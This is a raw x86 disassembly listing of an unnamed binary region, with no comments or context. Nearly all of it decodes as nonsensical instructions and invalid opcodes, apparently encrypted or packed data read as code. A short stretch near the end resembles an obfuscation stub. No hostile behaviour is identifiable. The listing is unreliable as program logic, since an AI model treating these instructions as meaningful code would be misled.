  40a9c2:	fnsave [ecx+0x293f3740]
  40a9c8:	cmp    BYTE PTR [esi+0x42],bl
  40a9cb:	out    dx,eax
  40a9cc:	xlat   BYTE PTR ds:[ebx]
  40a9cd:	push   ecx
  40a9ce:	pop    esi
  40a9cf:	lds    ebx,FWORD PTR [edx+0x6909d4c4]
  40a9d5:	repz je 0x40aa49
  40a9d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9d9:	dec    edx
  40a9da:	enter  0x6643,0x83
  40a9de:	js     0x40aa0e
  40a9e0:	out    0xf2,al
  40a9e2:	int3   
  40a9e3:	in     eax,0x74
  40a9e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9e6:	lea    ebx,[esi]
  40a9e8:	stos   DWORD PTR es:[edi],eax
  40a9e9:	push   es
  40a9ea:	inc    ecx
  40a9eb:	fs int 0x9c
  40a9ee:	ret    
  40a9ef:	xchg   BYTE PTR [eax+ecx*4],bh
  40a9f2:	into   
  40a9f3:	(bad)  
  40a9f4:	lds    ebp,FWORD PTR [ebp+0x10]
  40a9f7:	dec    edi
  40a9f8:	iret   
  40a9f9:	add    eax,0x55f67fb5
  40a9fe:	das    
  40a9ff:	in     ax,dx
  40aa01:	mov    ebp,0x675683cf
  40aa06:	sub    BYTE PTR [eax+0x2d],bl
  40aa09:	push   esp
  40aa0a:	dec    esp
  40aa0b:	inc    esi
  40aa0c:	ret    
  40aa0d:	xchg   ebp,eax
  40aa0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa0f:	(bad)  
  40aa10:	pop    edx
  40aa11:	fwait
  40aa12:	pop    edx
  40aa13:	mov    cs,WORD PTR [edx+ebx*4+0x3e]
  40aa17:	shr    ah,1
  40aa19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa1a:	call   0x52a9fc3b
  40aa1f:	sub    DWORD PTR [eax+0x1b],ebx
  40aa22:	mov    DWORD PTR [edi+0x38eb2be4],esi
  40aa28:	mov    ds:0x12957a99,eax
  40aa2d:	psubd  mm3,QWORD PTR [ebx]
  40aa30:	mov    al,0x34
  40aa32:	sub    ebp,0xf707e13b
  40aa38:	sbb    DWORD PTR [eax-0x140845d8],0xabce5da2
  40aa42:	mov    ds:0xe4d4b948,eax
  40aa47:	mov    ebx,0x149011a3
  40aa4c:	xchg   BYTE PTR [esi+0x74bbf375],al
  40aa52:	ds repz or eax,0x9902cbd1
  40aa59:	idiv   edi
  40aa5b:	jg     0x40aa8e
  40aa5d:	push   ecx
  40aa5e:	fsubr  DWORD PTR [eax-0x2a3400e6]
  40aa64:	push   cs
  40aa65:	fsubp  st(3),st
  40aa67:	fmul   QWORD PTR [eax-0x10626aa4]
  40aa6d:	jp     0x40aa6f
  40aa6f:	jg     0x40aa26
  40aa71:	scas   eax,DWORD PTR es:[edi]
  40aa72:	shl    dh,1
  40aa74:	fsubr  QWORD PTR [edx-0x23]
  40aa77:	mov    BYTE PTR [ecx+0x2a],dh
  40aa7a:	and    dh,al
  40aa7c:	outs   dx,DWORD PTR ds:[esi]
  40aa7d:	push   ebp
  40aa7e:	push   edi
  40aa7f:	pop    esi
  40aa80:	inc    edx
  40aa81:	sbb    eax,0xb40912ee
  40aa86:	pop    edi
  40aa87:	jg     0x40aaf4
  40aa89:	push   ebx
  40aa8a:	aaa    
  40aa8b:	xchg   esi,eax
  40aa8c:	dec    eax
  40aa8d:	loopne 0x40ab06
  40aa8f:	scas   eax,DWORD PTR es:[edi]
  40aa90:	inc    edx
  40aa91:	addr16 pop ebx
  40aa93:	push   esp
  40aa94:	jbe    0x40ab14
  40aa96:	mov    cl,0x7c
  40aa98:	pop    ds
  40aa99:	shl    BYTE PTR [ebx-0x122f169c],1
  40aa9f:	es js  0x40ab02
  40aaa2:	popf   
  40aaa3:	lods   al,BYTE PTR ds:[esi]
  40aaa4:	cli    
  40aaa5:	inc    esi
  40aaa6:	pop    es
  40aaa7:	jp     0x40aac8
  40aaa9:	mov    ds:0xe19d28f8,eax
  40aaae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aaaf:	adc    esi,DWORD PTR [esi]
  40aab1:	jle    0x40aadc
  40aab3:	mov    al,ds:0xad2482d5
  40aab8:	sbb    BYTE PTR [edi],0xfe
  40aabb:	es enter 0xbdba,0x69
  40aac0:	push   esp
  40aac1:	inc    ebx
  40aac2:	or     cl,BYTE PTR [ecx]
  40aac4:	call   0x5ea3ca8a
  40aac9:	jbe    0x40aa7e
  40aacb:	mov    dl,0xb5
  40aacd:	dec    eax
  40aace:	ss aad 0x57
  40aad1:	test   DWORD PTR [eax-0x50550418],ecx
  40aad7:	mov    al,ds:0x9539b0f9
  40aadc:	fsub   DWORD PTR [edx-0x1f]
  40aadf:	bound  ebp,QWORD PTR [eax]
  40aae1:	xor    al,0x13
  40aae3:	mov    ch,0x1b
  40aae5:	sbb    eax,0x9040dbca
  40aaea:	sbb    ebx,DWORD PTR [eax-0x2944e19a]
  40aaf0:	lahf   
  40aaf1:	pop    eax
  40aaf2:	cs push cs
  40aaf4:	jl     0x40ab23
  40aaf6:	clc    
  40aaf7:	cli    
  40aaf8:	nop
  40aaf9:	loop   0x40aae2
  40aafb:	and    eax,0xb0700ed8
  40ab00:	xchg   BYTE PTR [eax-0x1f788b9e],dh
  40ab06:	cmp    esi,DWORD PTR [ebp-0x58]
  40ab09:	inc    edi
  40ab0a:	inc    edi
  40ab0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab0c:	push   ebp
  40ab0d:	lods   eax,DWORD PTR ss:[esi]
  40ab0f:	cwde   
  40ab10:	(bad)  
  40ab11:	fild   QWORD PTR [ebp+eax*4-0x78187741]
  40ab18:	ins    DWORD PTR es:[edi],dx
  40ab19:	loop   0x40aad9
  40ab1b:	inc    esi
  40ab1c:	js     0x40ab99
  40ab1e:	xor    ebx,0xffffffdf
  40ab21:	mov    edi,0xfa3a0119
  40ab26:	in     eax,0x55
  40ab28:	jl     0x40aaf3
  40ab2a:	add    BYTE PTR [ecx],dl
  40ab2c:	mov    al,ds:0x4992449f
  40ab31:	arpl   WORD PTR [edi],di
  40ab33:	nop
  40ab34:	in     al,dx
  40ab35:	jmp    0x4a949c55
  40ab3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab3b:	xlat   BYTE PTR ds:[ebx]
  40ab3c:	adc    al,0xe4
  40ab3e:	inc    esi
  40ab3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab40:	inc    DWORD PTR [eax+ebp*4]
  40ab43:	push   eax
  40ab44:	adc    ch,dl
  40ab46:	mov    BYTE PTR [esi+edi*2+0x43],al
  40ab4a:	and    eax,0x56bf5fd7
  40ab4f:	lea    esp,[ebp-0x76294929]
  40ab55:	push   0x8955e1b7
  40ab5a:	cmp    bh,BYTE PTR [esi]
  40ab5c:	xchg   edx,eax
  40ab5d:	push   edx
  40ab5e:	mov    BYTE PTR [edx-0xf],al
  40ab61:	xor    cl,BYTE PTR [edx+0x7a213ac]
  40ab67:	inc    ebx
  40ab68:	ins    DWORD PTR es:[edi],dx
  40ab69:	mov    cl,0x19
  40ab6b:	and    al,0x4
  40ab6d:	jecxz  0x40ab46
  40ab6f:	data16 sub al,dl
  40ab72:	pop    edx
  40ab73:	dec    esp
  40ab74:	inc    ebx
  40ab75:	ret    
  40ab76:	int3   
  40ab77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab78:	mov    bl,BYTE PTR cs:[ebx+eiz*4+0x1c]
  40ab7d:	jae    0x40ab2e
  40ab7f:	inc    esi
  40ab80:	lods   eax,DWORD PTR ds:[esi]
  40ab81:	test   BYTE PTR [edi-0x457c67a3],dh
  40ab87:	outs   dx,DWORD PTR ds:[esi]
  40ab88:	xchg   edx,eax
  40ab89:	out    dx,eax
  40ab8a:	hlt    
  40ab8b:	and    al,BYTE PTR [ebx]
  40ab8d:	jmp    0x40ab69
  40ab8f:	imul   eax,DWORD PTR [edx+0x57e472cc],0x519b1bb8
  40ab99:	stc    
  40ab9a:	in     eax,0x24
  40ab9c:	dec    eax
  40ab9d:	sub    bl,dl
  40ab9f:	ret    
  40aba0:	push   ebp
  40aba1:	int    0xf3
  40aba3:	add    al,0xb8
  40aba5:	bound  esp,QWORD PTR [esi]
  40aba7:	lods   eax,DWORD PTR ds:[esi]
  40aba9:	(bad)  
  40abaa:	not    DWORD PTR [ecx-0x6c581def]
  40abb0:	jp     0x40ab9e
  40abb2:	cmp    BYTE PTR [ecx-0x7cbf567a],al
  40abb8:	mov    ds:0x78e61185,al
  40abbd:	mov    al,ds:0x8113198b
  40abc2:	and    dh,BYTE PTR [eax]
  40abc4:	xor    al,0x40
  40abc6:	push   ss
  40abc7:	push   esp
  40abc8:	push   edi
  40abc9:	add    DWORD PTR [esp+esi*1],edi
  40abcc:	mov    edi,0x8fd4f50d
  40abd1:	(bad)  
  40abd2:	scas   eax,DWORD PTR es:[edi]
  40abd3:	test   eax,0x2651f8ee
  40abd8:	inc    eax
  40abd9:	xchg   DWORD PTR [esi+0x13a247c2],esp
  40abdf:	cmp    eax,0x4f22e44e
  40abe4:	aam    0x7a
  40abe6:	ret    
  40abe7:	inc    ebp
  40abe8:	(bad)  
  40abe9:	adc    DWORD PTR [ecx-0x6586168e],0x203bbbb1
  40abf3:	test   DWORD PTR [esp+eiz*2-0x6e],esp
  40abf7:	mov    ah,0x93
  40abf9:	enter  0xe21d,0xac
  40abfd:	cmc    
  40abfe:	push   ds
  40abff:	sub    esi,DWORD PTR [edx+0x36]
  40ac02:	pop    eax
  40ac03:	cmp    BYTE PTR [ebp-0x62],bl
  40ac06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac07:	arpl   WORD PTR [eax],bx
  40ac09:	inc    eax
  40ac0a:	mov    WORD PTR [ebx],ds
  40ac0c:	xchg   ebp,eax
  40ac0d:	inc    edx
  40ac0e:	scas   al,BYTE PTR es:[edi]
  40ac0f:	cmp    bh,dl
  40ac11:	pop    ecx
  40ac12:	js     0x40abcc
  40ac14:	scas   eax,DWORD PTR es:[edi]
  40ac15:	pop    ds
  40ac16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac17:	fwait
  40ac18:	mov    eax,0xe9bb8b13
  40ac1d:	pop    esp
  40ac1e:	inc    ecx
  40ac1f:	push   ebx
  40ac20:	cwde   
  40ac21:	pop    ebp
  40ac22:	repnz dec ebp
  40ac24:	lods   al,BYTE PTR ds:[esi]
  40ac25:	test   DWORD PTR [ebp-0x1d],esi
  40ac28:	inc    esi
  40ac29:	xchg   ebp,eax
  40ac2a:	iret   
  40ac2b:	pop    ecx
  40ac2c:	lods   al,BYTE PTR ds:[esi]
  40ac2d:	mov    ds:0x3a4337a7,eax
  40ac32:	je     0x40ac3e
  40ac34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac35:	mov    edx,ecx
  40ac37:	inc    esi
  40ac38:	adc    DWORD PTR [edi+0x5c65d94e],0x2b
  40ac3f:	call   0x5d461bf
  40ac44:	or     BYTE PTR [ebx],dh
  40ac46:	mov    eax,0x51023468
  40ac4b:	loope  0x40ac65
  40ac4d:	sub    ah,ah
  40ac4f:	or     ch,ch
  40ac51:	imul   ebx,ecx,0xfffffff2
  40ac54:	xor    cl,BYTE PTR [edi+0x111c3da8]
  40ac5a:	dec    eax
  40ac5b:	xchg   esi,eax
  40ac5c:	sti    
  40ac5d:	pop    ecx
  40ac5e:	dec    esi
  40ac5f:	aam    0x8d
  40ac61:	mov    ecx,0x2dda9e02
  40ac66:	ds push ebp
  40ac68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac69:	inc    esp
  40ac6a:	push   eax
  40ac6b:	mov    ds:0x4912d41b,al
  40ac70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac71:	and    edx,DWORD PTR [edx+eax*8]
  40ac74:	sub    BYTE PTR [edi+esi*8],0x9d
  40ac78:	jge    0x40abfe
  40ac7a:	push   ss
  40ac7b:	mov    ss,ebx
  40ac7d:	pop    ss
  40ac7e:	ficom  WORD PTR [ecx]
  40ac80:	enter  0x474f,0xb4
  40ac84:	out    0x3d,al
  40ac86:	shl    ah,cl
  40ac88:	sub    dh,BYTE PTR [esp+edx*8+0x6d]
  40ac8c:	adc    esi,DWORD PTR [esi]
  40ac8e:	call   0x66d8:0xd30007d7
  40ac95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac96:	addr16 push eax
  40ac98:	jp     0x40accf
  40ac9a:	mov    esp,DWORD PTR [edx]
  40ac9c:	sub    DWORD PTR [eax],esp
  40ac9e:	xchg   ecx,eax
  40ac9f:	int3   
  40aca0:	and    ch,BYTE PTR [ebp-0x177299a8]
  40aca6:	pop    edx
  40aca7:	pop    ebp
  40aca8:	retf   
  40aca9:	pop    DWORD PTR [esi+0x304a8784]
  40acaf:	loopne 0x40acc0
  40acb1:	mov    ds:0x1929608f,al
  40acb6:	jns    0x40acfe
  40acb8:	fldenv [esi-0x53]
  40acbb:	add    BYTE PTR [esi+0x5bab20c3],bh
  40acc1:	sub    BYTE PTR [ebx-0x13],ch
  40acc4:	cmp    ecx,DWORD PTR [ebp-0xcff2a3f]
  40acca:	loope  0x40ac8b
  40accc:	xor    ah,BYTE PTR [eax-0x42]
  40accf:	lock and dh,al
  40acd2:	add    bh,BYTE PTR [eax+0x62]
  40acd5:	pop    ds
  40acd6:	xchg   ebp,eax
  40acd7:	loop   0x40aca9
  40acd9:	fld    DWORD PTR [esp+ebp*8+0x6a]
  40acdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acde:	lods   eax,DWORD PTR ds:[esi]
  40acdf:	xlat   BYTE PTR ds:[ebx]
  40ace0:	out    dx,al
  40ace1:	xchg   edi,eax
  40ace2:	mov    eax,ds:0xe601b8fb
  40ace7:	pop    ds
  40ace8:	pop    edi
  40ace9:	or     ebx,DWORD PTR [edx+0x6b]
  40acec:	inc    ebp
  40aced:	dec    esp
  40acee:	idiv   bl
  40acf0:	or     al,0xbf
  40acf2:	and    BYTE PTR [edi+0x62f69fa3],bh
  40acf8:	ds dec edi
  40acfa:	rcr    DWORD PTR [edx],cl
  40acfc:	loopne 0x40ac9c
  40acfe:	mov    ebx,0x905d0637
  40ad03:	mov    bh,0xb3
  40ad05:	mov    eax,0xc41f7a84
  40ad0a:	mov    ecx,0xfa831853
  40ad0f:	mov    esp,edi
  40ad11:	cs ins BYTE PTR es:[edi],dx
  40ad13:	je     0x40ad7e
  40ad15:	dec    esi
  40ad16:	sub    al,0xc0
  40ad18:	out    dx,al
  40ad19:	lods   eax,DWORD PTR ds:[esi]
  40ad1a:	test   DWORD PTR [eax],ecx
  40ad1c:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40ad1e:	stos   DWORD PTR es:[edi],eax
  40ad1f:	loop   0x40acc7
  40ad21:	fistp  DWORD PTR [eax-0x6a8bce3c]
  40ad27:	ins    BYTE PTR es:[edi],dx
  40ad28:	adc    ebx,DWORD PTR [ecx]
  40ad2a:	test   eax,0x47327e04
  40ad2f:	mov    al,0xe
  40ad31:	sbb    DWORD PTR [esi-0x5b56e658],ebp
  40ad37:	jne    0x40ad05
  40ad39:	or     esi,DWORD PTR [ecx-0x1199c449]
  40ad3f:	daa    
  40ad40:	fadd   DWORD PTR [esi-0x49093be8]
  40ad46:	sbb    ebx,DWORD PTR [edi+0x7c8e234f]
  40ad4c:	(bad)  
  40ad4d:	sub    eax,0xe62e76ad
  40ad52:	mov    BYTE PTR [edi],bl
  40ad54:	enter  0x65e4,0x12
  40ad58:	mov    bl,0xa9
  40ad5a:	ins    BYTE PTR es:[edi],dx
  40ad5b:	lods   al,BYTE PTR ds:[esi]
  40ad5c:	js     0x40adb9
  40ad5e:	pop    esp
  40ad5f:	fdivr  DWORD PTR [edx-0x46]
  40ad62:	xchg   DWORD PTR ds:[ebx+0x2e5e509],ebp
  40ad69:	ret    
  40ad6a:	xor    al,0x1e
  40ad6c:	lea    edi,[ebp+0x7ad64b51]
  40ad72:	fwait
  40ad73:	mov    bh,0xc9
  40ad75:	aaa    
  40ad76:	jp     0x40ad80
  40ad78:	addr16 xchg edx,eax
  40ad7a:	icebp  
  40ad7b:	retf   
  40ad7c:	pusha  
  40ad7d:	jp     0x40adf5
  40ad7f:	daa    
  40ad80:	inc    esi
  40ad81:	sub    ebx,DWORD PTR [ecx]
  40ad83:	mov    cl,0xc3
  40ad85:	data16 cmp BYTE PTR [esi-0x46d9ea97],bl
  40ad8c:	mov    es,WORD PTR [edx+0x5e]
  40ad8f:	jge    0x40add4
  40ad91:	or     bh,cl
  40ad93:	out    0x58,al
  40ad95:	call   0x8da222a1
  40ad9a:	xchg   esp,eax
  40ad9b:	inc    ebx
  40ad9c:	call   DWORD PTR [esi-0x77]
  40ad9f:	ss mov bl,0xd3
  40ada2:	stc    
  40ada3:	xor    esp,DWORD PTR [eax]
  40ada5:	jmp    0x40ad77
  40ada7:	inc    edi
  40ada8:	adc    ecx,edx
  40adaa:	mov    ds:0x5f94a5,eax
  40adaf:	jmp    0x40adda
  40adb1:	cdq    
  40adb2:	xchg   ebp,eax
  40adb3:	popf   
  40adb4:	mov    BYTE PTR ds:0x590c54e3,bl
  40adba:	add    al,0xcc
  40adbc:	sub    al,BYTE PTR [edi+0x41]
  40adbf:	inc    edx
  40adc0:	push   ds
  40adc1:	fucomip st,st(0)
  40adc3:	jmp    0xda97:0xd89326c3
  40adca:	push   edx
  40adcb:	push   edi
  40adcc:	sahf   
  40adcd:	jb     0x40ae25
  40adcf:	arpl   si,cx
  40add1:	out    dx,eax
  40add2:	fisttp DWORD PTR [edx]
  40add4:	mov    dl,0x5a
  40add6:	pop    ss
  40add7:	jae    0x40adcc
  40add9:	xor    esp,DWORD PTR [esi-0x75]
  40addc:	and    eax,0x1fe1c776
  40ade1:	mov    ds:0x21c01298,al
  40ade6:	and    ecx,eax
  40ade8:	(bad)  
  40ade9:	pop    eax
  40adea:	cmp    DWORD PTR [edi+0xa],esp
  40aded:	push   ds
  40adee:	call   0x6754:0xf6804260
  40adf5:	cmp    DWORD PTR [edx+0x4c],edx
  40adf8:	ins    DWORD PTR es:[edi],dx
  40adf9:	jg     0x40ae61
  40adfb:	jp     0x40ae60
  40adfd:	imul   edi,DWORD PTR [ebx],0x22560152
  40ae03:	pop    ss
  40ae04:	dec    esi
  40ae05:	sbb    eax,0x51a1ab8f
  40ae0a:	outs   dx,DWORD PTR ds:[esi]
  40ae0b:	sbb    BYTE PTR [ecx-0x3f],0x62
  40ae0f:	push   cs
  40ae10:	cld    
  40ae11:	sahf   
  40ae12:	mov    ah,0xe7
  40ae14:	or     eax,0x6146ccda
  40ae19:	cmc    
  40ae1a:	stos   BYTE PTR es:[edi],al
  40ae1b:	sbb    dh,BYTE PTR [edx+ebx*4]
  40ae1e:	clc    
  40ae1f:	imul   dh
  40ae21:	jecxz  0x40ae8c
  40ae23:	sbb    al,0x7
  40ae25:	jmp    0x3a0106c9
  40ae2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae2b:	les    eax,FWORD PTR cs:[eax+esi*2]
  40ae2f:	daa    
  40ae30:	outs   dx,DWORD PTR ds:[esi]
  40ae31:	sub    DWORD PTR [ecx+0x10b7343a],ecx
  40ae37:	sahf   
  40ae38:	ror    BYTE PTR [esi+0x39],0xa5
  40ae3c:	shr    al,1
  40ae3e:	stos   BYTE PTR es:[edi],al
  40ae3f:	icebp  
  40ae40:	mov    ss,WORD PTR [ebx+0x7eb2d32d]
  40ae46:	(bad)
  40ae49:	in     eax,dx
  40ae4a:	outs   dx,BYTE PTR ds:[esi]
  40ae4b:	pop    ebp
  40ae4c:	xchg   ecx,eax
  40ae4d:	daa    
  40ae4e:	outs   dx,BYTE PTR ds:[esi]
  40ae4f:	lods   eax,DWORD PTR ds:[esi]
  40ae50:	(bad)  [ebp+0x6966c3ea]
  40ae56:	ins    DWORD PTR es:[edi],dx
  40ae57:	inc    edi
  40ae58:	xor    eax,0x4b96bbc3
  40ae5d:	(bad)  
  40ae5e:	repz push ebp
  40ae60:	sub    BYTE PTR [eax+0x28],ch
  40ae63:	inc    eax
  40ae64:	jno    0x40ae0b
  40ae66:	std    
  40ae67:	div    BYTE PTR [ebx+0x39]
  40ae6a:	cwde   
  40ae6b:	sahf   
  40ae6c:	jne    0x40aea3
  40ae6e:	push   es
  40ae6f:	lock jnp 0x40ae40
  40ae72:	inc    edi
  40ae73:	sub    eax,0x77bd02ae
  40ae78:	fistp  DWORD PTR [ebx+0x2470a94b]
  40ae7e:	inc    esi
  40ae7f:	outs   dx,BYTE PTR ds:[esi]
  40ae80:	out    0xb9,eax
  40ae82:	jne    0x40aeb4
  40ae84:	xor    eax,0x250a2031
  40ae89:	inc    eax
  40ae8a:	jbe    0x40aed4
  40ae8c:	(bad)  
  40ae8e:	cmp    esi,DWORD PTR [edx]
  40ae90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae91:	sahf   
  40ae92:	jp     0x40ae99
  40ae94:	rol    BYTE PTR [edx],1
  40ae96:	pop    es
  40ae97:	test   al,0x61
  40ae99:	ins    BYTE PTR es:[edi],dx
  40ae9a:	jg     0x40af0e
  40ae9c:	(bad)  
  40ae9d:	jns    0x40ae27
  40ae9f:	addr16 ds pop edi
  40aea2:	sbb    bh,bh
  40aea4:	fwait
  40aea5:	hlt    
  40aea6:	neg    BYTE PTR [ebp-0x4e]
  40aea9:	xchg   ebp,eax
  40aeaa:	xchg   ebp,eax
  40aeab:	enter  0xec17,0x3d
  40aeaf:	push   ds
  40aeb0:	sbb    BYTE PTR [edi-0x63],dh
  40aeb3:	cld    
  40aeb4:	push   ebx
  40aeb5:	xchg   ah,al
  40aeb7:	test   BYTE PTR [edx],ah
  40aeb9:	ds add al,0x93
  40aebc:	push   ebp
  40aebd:	sbb    ecx,DWORD PTR [eax]
  40aebf:	mov    edi,0x9c4ef957
  40aec4:	xchg   BYTE PTR [ebp+0x191613b2],dh
  40aeca:	fidiv  WORD PTR [edx-0xb98303c]
  40aed0:	xlat   BYTE PTR ds:[ebx]
  40aed1:	pusha  
  40aed2:	cdq    
  40aed3:	xchg   al,al
  40aed5:	outs   dx,DWORD PTR ds:[esi]
  40aed6:	in     al,0x83
  40aed8:	xor    eax,0x5260ed49
  40aedd:	imul   edi,DWORD PTR [edi+ecx*2-0x3e],0x47b19963
  40aee5:	adc    eax,0xe6d6b9c4
  40aeea:	mov    gs,ebp
  40aeec:	push   0x4f
  40aeee:	xchg   ebx,eax
  40aeef:	lock xchg ecx,eax
  40aef1:	sub    BYTE PTR [eax+0x441134e8],cl
  40aef7:	pop    edx
  40aef8:	hlt    
  40aef9:	ins    BYTE PTR es:[edi],dx
  40aefa:	mov    ah,0x91
  40aefc:	ret    0x36d2
  40aeff:	xor    bh,al
  40af01:	mov    ebx,0x8ff8ab5b
  40af06:	lds    esp,FWORD PTR [ebx-0x29]
  40af09:	call   0xc5cd:0xf38ef7e4
  40af10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af11:	jb     0x40aeec
  40af13:	sbb    bl,dh
  40af15:	jno    0x40af8a
  40af17:	xor    esp,DWORD PTR ds:0x9a65cd63
  40af1d:	mov    WORD PTR [edx],es
  40af1f:	add    eax,0xab68a2d3
  40af24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af25:	push   eax
  40af26:	xchg   ecx,eax
  40af27:	push   esp
  40af28:	add    eax,0xa90d028a
  40af2d:	(bad)  
  40af2e:	xor    eax,0x43de14eb
  40af33:	vpunpckhdq xmm6,xmm7,XMMWORD PTR [eax]
  40af37:	mov    ds:0xe6f2087,eax
  40af3c:	dec    edi
  40af3d:	mov    ecx,0x639201de
  40af42:	mov    eax,ds:0xc21b4434
  40af47:	cmp    DWORD PTR [edx+0x41afe805],ecx
  40af4d:	popa   
  40af4e:	outs   dx,DWORD PTR ds:[esi]
  40af4f:	retf   0xbadc
  40af52:	dec    edx
  40af53:	int    0xe2
  40af55:	inc    esp
  40af56:	aaa    
  40af57:	mov    esp,edx
  40af59:	(bad)
  40af5c:	and    ebp,DWORD PTR [ebx-0x5a5cb8d2]
  40af62:	sbb    eax,0x1ba7a1b1
  40af67:	stc    
  40af68:	mov    esi,0xb0bb9132
  40af6d:	fild   QWORD PTR [ecx+0x6f]
  40af70:	xchg   BYTE PTR [ecx+0x2f],dl
  40af73:	sbb    al,0x26
  40af75:	mov    esp,0xd4610407
  40af7a:	jmp    0xab25a9bb
  40af7f:	popf   
  40af80:	cld    
  40af81:	popf   
  40af82:	popf   
  40af83:	int3   
  40af84:	in     al,0xcd
  40af86:	lea    eax,[ebx-0x40]
  40af89:	fld    TBYTE PTR [ebx]
  40af8b:	jnp    0x40af24
  40af8d:	xlat   BYTE PTR ds:[ebx]
  40af8e:	ret    
  40af8f:	pusha  
  40af90:	aas    
  40af91:	adc    DWORD PTR [edx],ecx
  40af93:	adc    esp,DWORD PTR [edi-0x4df5176e]
  40af99:	xor    eax,0xc443d84f
  40af9e:	pusha  
  40af9f:	(bad)  
  40afa0:	in     eax,0xd5
  40afa2:	sti    
  40afa3:	popf   
  40afa4:	inc    esi
  40afa5:	daa    
  40afa6:	cmp    BYTE PTR [ebp+0x56ac3b4d],ah
  40afac:	push   edi
  40afad:	mov    al,0x1c
  40afaf:	pushf  
  40afb0:	pop    es
  40afb1:	leave  
  40afb2:	out    dx,al
  40afb3:	inc    dx
  40afb5:	or     dl,ah
  40afb7:	cmp    DWORD PTR [esi-0x1930a8e],ecx
  40afbd:	cli    
  40afbe:	call   0xe1852533
  40afc3:	cld    
  40afc4:	dec    ebp
  40afc5:	fcmovnu st,st(1)
  40afc7:	seta   BYTE PTR [esp+edi*2-0x42]
  40afcc:	jbe    0x40af59
  40afce:	inc    ebp
  40afcf:	cld    
  40afd0:	xor    eax,esi
  40afd2:	add    eax,edi
  40afd4:	mov    DWORD PTR [ebp-0x10],eax
  40afd7:	mov    ebx,0x65655
  40afdc:	add    ebx,0x3234
  40afe2:	xchg   ebx,esi
  40afe4:	xor    ebx,ebx
  40afe6:	push   esi
  40afe7:	mov    esi,ebx
  40afe9:	pop    ebx
  40afea:	mov    edx,esi
  40afec:	jmp    0x40d37e
  40aff1:	cli    
  40aff2:	mov    DWORD PTR [ecx-0x65b47dad],esi
  40aff8:	add    BYTE PTR ds:0xc129b0d0,0xd3
  40afff:	out    0x1a,eax
  40b001:	sub    esp,esi
  40b003:	add    DWORD PTR [ebx-0x7c7ca1f4],0xffffffb6
  40b00a:	test   BYTE PTR [edi+edx*1],dl
  40b00d:	nop
  40b00e:	push   0xffffffa1
  40b010:	pop    eax
  40b011:	fiadd  DWORD PTR [ebx]
  40b013:	fs es mov es:0x954150fb,al
  40b01b:	mov    WORD PTR [edi],?
  40b01d:	sub    esi,esi
  40b01f:	je     0x40b083
  40b021:	cmp    ch,0x4a
  40b024:	cs sbb edi,ebp
  40b027:	ins    BYTE PTR es:[edi],dx
  40b028:	push   0x85af334e
  40b02d:	jg     0x40aff0
  40b02f:	jae    0x40b098
  40b031:	rcr    DWORD PTR [edi+ebp*4-0x56],1
  40b035:	pop    edx
  40b036:	add    eax,0xb5084401
  40b03b:	aas    
  40b03c:	mov    bl,0x56
  40b03e:	popf   
  40b03f:	xchg   edi,eax
  40b040:	push   ecx
  40b041:	pop    ebx
  40b042:	cmp    ecx,DWORD PTR [edx]
  40b044:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b045:	jb     0x40b099
  40b047:	ftst   
  40b049:	mov    dl,0xff
  40b04b:	jle    0x40b0ae
  40b04d:	and    eax,0xf88d1011
  40b052:	push   edx
  40b053:	aas    
  40b054:	and    eax,0xe683a8ee
  40b059:	sub    BYTE PTR [esi-0x80],bh
  40b05c:	inc    ebx
  40b05d:	retf   0x5e90
  40b060:	shr    esp,0x26
  40b063:	jle    0x40b0b4
  40b065:	xchg   edx,eax
  40b066:	dec    esp
  40b067:	test   al,0x20
  40b069:	xchg   esi,eax
  40b06a:	jns    0x40b06b
  40b06c:	mov    ?,WORD PTR [ebp+0x12]
  40b06f:	aam    0xf
  40b071:	inc    ebx
  40b072:	dec    edx
  40b073:	inc    ebp
  40b074:	sub    edx,0x21
  40b077:	inc    ecx
  40b078:	es adc ah,al
  40b07b:	nop
  40b07c:	adc    DWORD PTR [ecx-0x3b],0xffffffee
  40b080:	or     esp,DWORD PTR [ebp+0x1b]
  40b083:	fstp   QWORD PTR [esi]
  40b085:	sub    eax,0x704f6c27
  40b08a:	mov    ch,0x8f
  40b08c:	test   al,0xd7
  40b08e:	iret   
  40b08f:	popa   
  40b090:	sbb    al,0x0
  40b092:	add    dl,BYTE PTR [edi-0x27]
  40b095:	in     al,dx
  40b096:	repz call 0xc0e3:0x4c5cc1d3
  40b09e:	inc    eax
  40b09f:	shr    DWORD PTR [esi+0x50d169bc],0xef
  40b0a6:	cli    
  40b0a7:	add    DWORD PTR [ebp+0x5],esi
  40b0aa:	(bad)  
  40b0ab:	fmul   st(3),st
  40b0ad:	cwde   
  40b0ae:	or     eax,0xce45caf8
  40b0b3:	rol    DWORD PTR [edi-0x68],0x34
  40b0b7:	sub    DWORD PTR [ebx],edi
  40b0b9:	or     eax,0xe09c2122
  40b0be:	stos   DWORD PTR es:[edi],eax
  40b0bf:	pop    esi
  40b0c0:	(bad)  
  40b0c1:	jge    0x40b104
  40b0c3:	aaa    
  40b0c4:	fsub   st,st(1)
  40b0c6:	arpl   WORD PTR [bp-0x304],si
